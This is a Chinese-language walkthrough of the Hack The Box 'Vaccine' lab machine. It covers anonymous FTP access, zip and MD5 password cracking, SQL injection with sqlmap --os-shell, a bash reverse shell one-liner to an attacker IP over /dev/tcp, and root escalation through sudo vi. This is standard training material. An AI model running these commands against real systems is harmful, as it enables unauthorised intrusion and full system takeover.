---
title: HTB-Vaccine
description: 'Hack the box'
pubDate: 2024-03-02 
image: /public/hackthebox/Vaccine.png
categories:
  - Documentation
tags:
  - Hackthebox
  - Linux Machine
---

## TASK 1
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709380596563-a2cfb732-1083-4d2c-9820-b274814c58f3.png)

nmap扫一下

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709380641589-140127a9-7a28-4306-bf3b-00965a4d486a.png)

FTP服务托管

## TASK 2
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709380748093-19a08fd1-7636-4a0a-80a4-c05e16b85761.png)

anonymous 匿名用户

## TASK 3
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709380787696-82d38e9a-18f5-40fd-bb3d-b915e8525bd0.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709380878447-e8995f52-80dd-47ad-bfd8-4856f56876f2.png)

登录上去ls一下即可看到文件

## TASK 4
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709380910605-b509b246-a7a2-4a8b-b39a-18012a9383e3.png)

<font style="color:rgb(25, 27, 31);">bin或者binary</font>

<font style="color:rgb(25, 27, 31);">设置文件传输类型为二进制传输类型。一般默认为ascii传输类型，但是使用ascii模式传输类似于可执行文件时，会造成传输的文件内容不对。因此建议在上传或者下载文件之前，执行 </font><font style="color:rgb(25, 27, 31);background-color:rgb(248, 248, 250);">bin</font><font style="color:rgb(25, 27, 31);"> 命令将文件传输类型设置为二进制传输类型。</font>

<font style="color:rgb(25, 27, 31);">get 文件名即可</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709381113809-01572227-bdce-4cf0-83d6-a0aecb44f553.png)

发现压缩包内含有密码

使用john进行爆破

<font style="color:rgb(77, 77, 77);">压缩包中存在index.php，使用弱密码尝试解压压缩包，发现行不通，那就需要用到爆破工具来爆破密码了</font>  
<font style="color:rgb(77, 77, 77);">这时候会用到john的zip2john脚本，将加密压缩包的密码hash值导出到文件中，再用john对其进行爆破</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709381454233-9b744b30-0a23-44d7-9f06-d5068da84a5e.png)

## TASK 5
下载的压缩包里存在着文件，点击即可发现password

觉得像md5加密直接丢md5解密

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709381524493-8063ef65-54e8-43a8-9028-dda38c6be46c.png)

## TASK 6
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709381594031-d79cf3b0-14c0-4fcd-b55f-63ac050c6361.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709381768748-c9c24edd-3098-47b5-a627-0e7f0f25b28b.png)

### –os-shell原理
使用udf提权获取webshell，也是通过into outfile向服务器写入两个文件，一个是可以直接执行系统命令，一个是进行上传文件。

### –os-shell的执行条件：
dbms为mysql，网站必须是root权限

攻击者需要知道网站的绝对路径

magic_quotes_gpc = off，php主动转移功能关闭

## TASK 7
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709381868758-dc32d3e9-a36d-4468-aaf5-9c1a16ad22d6.png)

sqlmap -u [http://10.129.92.36/dashboard.php?search=1](http://10.129.92.36/dashboard.php?search=1) --cookie=PHPSESSID=s1c9n2bp4skgni8aeb889s6tjk --os-shell

先利用sqlmap 登录进去取得cookie防止被重定向到登录界面之后反弹shell

得到shell后

先查下id

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709382445738-20e30eb2-3fd0-4900-bd60-a0828f7af4a4.png)

<font style="color:rgb(25, 27, 31);">发现命令行不太对劲</font>

<font style="color:rgb(25, 27, 31);">进行反弹下shell</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/bin/bash -c 'bash -i >& /dev/tcp/</font><font style="color:rgb(13, 13, 13);">10.10.16.20</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/4444 0>&1'</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709382889257-12741c0d-ff90-4df1-8d74-5e65255d7c58.png)

成功反弹shell

<font style="color:rgb(25, 27, 31);">find / -group </font>**<font style="color:rgb(255, 255, 255);background-color:rgb(20, 29, 43);">postgres </font>**<font style="color:rgb(25, 27, 31);"> 2>/dev/null</font>

<font style="color:rgb(25, 27, 31);">发现大量可执行文件</font>

<font style="color:rgb(77, 77, 77);">使用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sudo -l</font><font style="color:rgb(77, 77, 77);">查看我们有哪些命令可以sudo使用</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709383403774-203c7b71-8160-4de9-879a-8b5170c89bd6.png)

<font style="color:rgb(77, 77, 77);">在nmap的扫描结果中知道靶机用的是apache服务，那就可以去</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">/var/www/html</font><font style="color:rgb(77, 77, 77);">目录看下，发现有个dashboard.php</font>

> <font style="color:rgb(77, 77, 77);"> $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");</font>
>

<font style="color:rgb(77, 77, 77);">发现密码，直接ssh连接即可</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ssh postgres@10.129.92.36</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709383786351-75f9019a-938c-4365-ab20-8daac89e51dd.png)

发现可以运行vi

## TASK 8
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709383840105-0d02eb0f-c0c5-4aad-812f-5bf552ded10d.png)

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709383897429-c2c9920b-5400-415d-9ed8-154964cc33cd.png)

## TASK 9
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1709383961405-4a8db113-c830-4a95-a3d8-1d9a8e85a7da.png)

由于<font style="color:rgb(77, 77, 77);">发现我们可以sudo使用vi编辑/etc/postgresql/11/main/pg_hba.conf文件，那么就可以用sudo vi提权</font>

<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">进入vi界面后可能会界面重叠，直接输入</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">:!/bin/bash</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">再点击回车即可，输入</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">whoami</font><font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">发现已经成功提权为root</font>

> <font style="color:rgb(13, 13, 13);">在Vi编辑器中，</font>**<font style="color:rgb(13, 13, 13);">!</font>**<font style="color:rgb(13, 13, 13);">是用来执行shell命令的一个命令行操作符。当你在Vi编辑器中按下</font>**<font style="color:rgb(13, 13, 13);">!</font>**<font style="color:rgb(13, 13, 13);">后，它会让你在编辑器中执行一个外部的shell命令，并显示输出结果。例如，你提到的</font>**<font style="color:rgb(13, 13, 13);">!/bin/bash</font>**<font style="color:rgb(13, 13, 13);">将会执行</font>**<font style="color:rgb(13, 13, 13);">/bin/bash</font>**<font style="color:rgb(13, 13, 13);">这个shell，并进入到一个交互式的bash环境中。</font>
>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">dd6e058e814260bc70e9bbdef2715849</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">{感觉这个靶机相较于前面靶机简单好多好多}</font>



